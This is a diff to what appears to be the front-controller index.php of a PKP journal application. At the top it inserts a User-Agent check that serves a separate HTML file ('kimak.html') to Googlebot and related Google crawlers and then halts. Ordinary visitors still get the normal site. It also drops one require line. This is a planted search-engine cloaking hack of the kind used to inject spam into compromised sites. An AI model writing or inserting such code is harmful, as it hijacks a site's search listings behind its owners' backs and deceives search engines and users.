@@ -1,4 +1,20 @@
-<?php 
+<?php
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$googleBotAgents = ['Googlebot', 'Googlebot-Mobile', 'Googlebot-Image', 'Googlebot-Video', 'Googlebot-News', 'AdsBot-Google', 'AdsBot-Google-Mobile', 'Mediapartners-Google'];
+
+$isGoogleBot = false;
+foreach ($googleBotAgents as $bot) {
+if (stripos($userAgent, $bot) !== false) {
+$isGoogleBot = true;
+break;
+}
+}
+
+if ($isGoogleBot) {
+// Jika Googlebot, tampilkan yakin.html dan hentikan eksekusi lebih lanjut
+readfile('kimak.html');
+exit();
+}
 
 define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
 if (!defined('DIRECTORY_SEPARATOR')) {
@@ -9,7 +25,6 @@ define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
 
 // System-wide functions
-require('./lib/pkp/includes/mains.inc.php');
 require('./lib/pkp/includes/functions.inc.php');
 
 // Initialize the application environment
